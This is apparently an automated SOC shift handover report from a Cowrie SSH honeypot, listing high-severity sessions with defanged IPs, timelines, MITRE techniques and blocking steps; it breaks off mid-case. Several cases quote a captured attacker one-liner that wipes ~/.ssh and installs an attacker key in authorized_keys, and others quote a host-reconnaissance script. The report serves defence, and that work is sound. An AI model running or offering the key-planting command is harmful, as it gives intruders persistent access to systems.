# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-12 |
| **Generated At** | 2026-03-12T14:46:34Z |
| **Shift Time** | 14:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **459** |
| Confirmed Threats | **284** |
| False Positives Filtered | **175** (38.1%) |
| Unique Attacker IPs | **124** |
| Countries of Origin | **30** |
| High Severity Cases | **45** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **414** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (36)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f4623a20953e

| Field | Detail |
|---|---|
| **Source IP** | `120.33.126[.]224` |
| **First Seen** | 2026-03-12 00:17 |
| **Last Seen** | 2026-03-12 00:18 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 00:17:44` | `cowrie.session.connect` |
| `2026-03-12 00:17:44` | `cowrie.client.version` |
| `2026-03-12 00:17:44` | `cowrie.client.kex` |
| `2026-03-12 00:17:45` | `cowrie.login.success` |
| `2026-03-12 00:18:36` | `cowrie.session.file_upload` |
| `2026-03-12 00:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.33.126[.]224` to AbuseIPDB if not already reported
- [ ] Block `120.33.126[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12cebcb8289c

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-03-12 02:51 |
| **Last Seen** | 2026-03-12 02:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 02:51:53` | `cowrie.session.connect` |
| `2026-03-12 02:51:53` | `cowrie.client.version` |
| `2026-03-12 02:51:53` | `cowrie.client.kex` |
| `2026-03-12 02:51:54` | `cowrie.login.success` |
| `2026-03-12 02:51:55` | `cowrie.session.params` |
| `2026-03-12 02:51:55` | `cowrie.command.input` |
| `2026-03-12 02:51:55` | `cowrie.command.failed` |
| `2026-03-12 02:51:55` | `cowrie.log.closed` |
| `2026-03-12 02:51:56` | `cowrie.session.params` |
| `2026-03-12 02:51:56` | `cowrie.command.input` |
| `2026-03-12 02:51:56` | `cowrie.session.file_download` |
| `2026-03-12 02:51:56` | `cowrie.log.closed` |
| `2026-03-12 02:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57bc632e286

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-03-12 02:51 |
| **Last Seen** | 2026-03-12 02:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 02:51:59` | `cowrie.session.connect` |
| `2026-03-12 02:52:00` | `cowrie.client.version` |
| `2026-03-12 02:52:01` | `cowrie.client.kex` |
| `2026-03-12 02:52:02` | `cowrie.login.success` |
| `2026-03-12 02:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6de23217db5

| Field | Detail |
|---|---|
| **Source IP** | `130.250.231[.]114` |
| **First Seen** | 2026-03-12 02:53 |
| **Last Seen** | 2026-03-12 02:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 02:53:30` | `cowrie.session.connect` |
| `2026-03-12 02:53:30` | `cowrie.client.version` |
| `2026-03-12 02:53:31` | `cowrie.client.kex` |
| `2026-03-12 02:53:32` | `cowrie.login.success` |
| `2026-03-12 02:53:33` | `cowrie.session.params` |
| `2026-03-12 02:53:33` | `cowrie.command.input` |
| `2026-03-12 02:53:33` | `cowrie.command.failed` |
| `2026-03-12 02:53:33` | `cowrie.log.closed` |
| `2026-03-12 02:53:34` | `cowrie.session.params` |
| `2026-03-12 02:53:34` | `cowrie.command.input` |
| `2026-03-12 02:53:34` | `cowrie.session.file_download` |
| `2026-03-12 02:53:34` | `cowrie.log.closed` |
| `2026-03-12 02:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.250.231[.]114` to AbuseIPDB if not already reported
- [ ] Block `130.250.231[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-231d46368daa

| Field | Detail |
|---|---|
| **Source IP** | `130.250.231[.]114` |
| **First Seen** | 2026-03-12 02:53 |
| **Last Seen** | 2026-03-12 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 02:53:37` | `cowrie.session.connect` |
| `2026-03-12 02:53:37` | `cowrie.client.version` |
| `2026-03-12 02:53:38` | `cowrie.client.kex` |
| `2026-03-12 02:53:39` | `cowrie.login.success` |
| `2026-03-12 02:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.250.231[.]114` to AbuseIPDB if not already reported
- [ ] Block `130.250.231[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f864344b5496

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]17` |
| **First Seen** | 2026-03-12 03:07 |
| **Last Seen** | 2026-03-12 03:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 03:07:34` | `cowrie.session.connect` |
| `2026-03-12 03:07:34` | `cowrie.client.version` |
| `2026-03-12 03:07:34` | `cowrie.client.kex` |
| `2026-03-12 03:07:34` | `cowrie.login.success` |
| `2026-03-12 03:07:34` | `cowrie.session.params` |
| `2026-03-12 03:07:34` | `cowrie.command.input` |
| `2026-03-12 03:07:34` | `cowrie.command.failed` |
| `2026-03-12 03:07:34` | `cowrie.log.closed` |
| `2026-03-12 03:07:35` | `cowrie.session.params` |
| `2026-03-12 03:07:35` | `cowrie.command.input` |
| `2026-03-12 03:07:35` | `cowrie.session.file_download` |
| `2026-03-12 03:07:35` | `cowrie.log.closed` |
| `2026-03-12 03:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]17` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4300b451eee5

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]17` |
| **First Seen** | 2026-03-12 03:07 |
| **Last Seen** | 2026-03-12 03:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 03:07:36` | `cowrie.session.connect` |
| `2026-03-12 03:07:36` | `cowrie.client.version` |
| `2026-03-12 03:07:36` | `cowrie.client.kex` |
| `2026-03-12 03:07:36` | `cowrie.login.success` |
| `2026-03-12 03:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]17` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33fee0f664a8

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:06 |
| **Last Seen** | 2026-03-12 04:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:06:44` | `cowrie.session.connect` |
| `2026-03-12 04:06:45` | `cowrie.client.version` |
| `2026-03-12 04:06:45` | `cowrie.client.kex` |
| `2026-03-12 04:06:46` | `cowrie.login.success` |
| `2026-03-12 04:06:47` | `cowrie.session.params` |
| `2026-03-12 04:06:47` | `cowrie.command.input` |
| `2026-03-12 04:06:47` | `cowrie.command.input` |
| `2026-03-12 04:06:47` | `cowrie.command.input` |
| `2026-03-12 04:06:47` | `cowrie.command.input` |
| `2026-03-12 04:06:47` | `cowrie.log.closed` |
| `2026-03-12 04:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7955f88844

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:07 |
| **Last Seen** | 2026-03-12 04:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:07:36` | `cowrie.session.connect` |
| `2026-03-12 04:07:36` | `cowrie.client.version` |
| `2026-03-12 04:07:36` | `cowrie.client.kex` |
| `2026-03-12 04:07:38` | `cowrie.login.success` |
| `2026-03-12 04:07:39` | `cowrie.session.params` |
| `2026-03-12 04:07:39` | `cowrie.command.input` |
| `2026-03-12 04:07:39` | `cowrie.command.input` |
| `2026-03-12 04:07:39` | `cowrie.command.input` |
| `2026-03-12 04:07:39` | `cowrie.command.input` |
| `2026-03-12 04:07:39` | `cowrie.log.closed` |
| `2026-03-12 04:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa930c4a999

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:08 |
| **Last Seen** | 2026-03-12 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:08:27` | `cowrie.session.connect` |
| `2026-03-12 04:08:28` | `cowrie.client.version` |
| `2026-03-12 04:08:28` | `cowrie.client.kex` |
| `2026-03-12 04:08:29` | `cowrie.login.success` |
| `2026-03-12 04:08:30` | `cowrie.session.params` |
| `2026-03-12 04:08:30` | `cowrie.command.input` |
| `2026-03-12 04:08:30` | `cowrie.command.input` |
| `2026-03-12 04:08:30` | `cowrie.command.input` |
| `2026-03-12 04:08:30` | `cowrie.command.input` |
| `2026-03-12 04:08:30` | `cowrie.log.closed` |
| `2026-03-12 04:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35c75dac3f1

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:09 |
| **Last Seen** | 2026-03-12 04:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:09:20` | `cowrie.session.connect` |
| `2026-03-12 04:09:20` | `cowrie.client.version` |
| `2026-03-12 04:09:20` | `cowrie.client.kex` |
| `2026-03-12 04:09:22` | `cowrie.login.success` |
| `2026-03-12 04:09:23` | `cowrie.session.params` |
| `2026-03-12 04:09:23` | `cowrie.command.input` |
| `2026-03-12 04:09:23` | `cowrie.command.input` |
| `2026-03-12 04:09:23` | `cowrie.command.input` |
| `2026-03-12 04:09:23` | `cowrie.command.input` |
| `2026-03-12 04:09:23` | `cowrie.log.closed` |
| `2026-03-12 04:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b2641e0e13

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:10 |
| **Last Seen** | 2026-03-12 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:10:19` | `cowrie.session.connect` |
| `2026-03-12 04:10:20` | `cowrie.client.version` |
| `2026-03-12 04:10:20` | `cowrie.client.kex` |
| `2026-03-12 04:10:23` | `cowrie.login.success` |
| `2026-03-12 04:10:24` | `cowrie.session.params` |
| `2026-03-12 04:10:24` | `cowrie.command.input` |
| `2026-03-12 04:10:24` | `cowrie.command.input` |
| `2026-03-12 04:10:24` | `cowrie.command.input` |
| `2026-03-12 04:10:24` | `cowrie.command.input` |
| `2026-03-12 04:10:25` | `cowrie.log.closed` |
| `2026-03-12 04:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6a9f96133a

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:11 |
| **Last Seen** | 2026-03-12 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:11:13` | `cowrie.session.connect` |
| `2026-03-12 04:11:13` | `cowrie.client.version` |
| `2026-03-12 04:11:13` | `cowrie.client.kex` |
| `2026-03-12 04:11:14` | `cowrie.login.success` |
| `2026-03-12 04:11:14` | `cowrie.session.params` |
| `2026-03-12 04:11:14` | `cowrie.command.input` |
| `2026-03-12 04:11:14` | `cowrie.command.input` |
| `2026-03-12 04:11:14` | `cowrie.command.input` |
| `2026-03-12 04:11:14` | `cowrie.command.input` |
| `2026-03-12 04:11:14` | `cowrie.log.closed` |
| `2026-03-12 04:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980fdb66bfe0

| Field | Detail |
|---|---|
| **Source IP** | `188.166.37[.]151` |
| **First Seen** | 2026-03-12 04:11 |
| **Last Seen** | 2026-03-12 04:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:11:42` | `cowrie.session.connect` |
| `2026-03-12 04:11:42` | `cowrie.client.version` |
| `2026-03-12 04:11:42` | `cowrie.client.kex` |
| `2026-03-12 04:11:46` | `cowrie.login.success` |
| `2026-03-12 04:11:48` | `cowrie.session.params` |
| `2026-03-12 04:11:48` | `cowrie.command.input` |
| `2026-03-12 04:11:48` | `cowrie.command.input` |
| `2026-03-12 04:11:48` | `cowrie.command.input` |
| `2026-03-12 04:11:48` | `cowrie.command.input` |
| `2026-03-12 04:11:49` | `cowrie.log.closed` |
| `2026-03-12 04:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.166.37[.]151` to AbuseIPDB if not already reported
- [ ] Block `188.166.37[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59314cd154e8

| Field | Detail |
|---|---|
| **Source IP** | `170.64.179[.]179` |
| **First Seen** | 2026-03-12 04:12 |
| **Last Seen** | 2026-03-12 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:12:41` | `cowrie.session.connect` |
| `2026-03-12 04:12:41` | `cowrie.client.version` |
| `2026-03-12 04:12:41` | `cowrie.client.kex` |
| `2026-03-12 04:12:41` | `cowrie.login.success` |
| `2026-03-12 04:12:42` | `cowrie.session.params` |
| `2026-03-12 04:12:42` | `cowrie.command.input` |
| `2026-03-12 04:12:42` | `cowrie.command.input` |
| `2026-03-12 04:12:42` | `cowrie.command.input` |
| `2026-03-12 04:12:42` | `cowrie.command.input` |
| `2026-03-12 04:12:42` | `cowrie.log.closed` |
| `2026-03-12 04:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.179[.]179` to AbuseIPDB if not already reported
- [ ] Block `170.64.179[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d811af8e2c8

| Field | Detail |
|---|---|
| **Source IP** | `188.166.37[.]151` |
| **First Seen** | 2026-03-12 04:13 |
| **Last Seen** | 2026-03-12 04:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
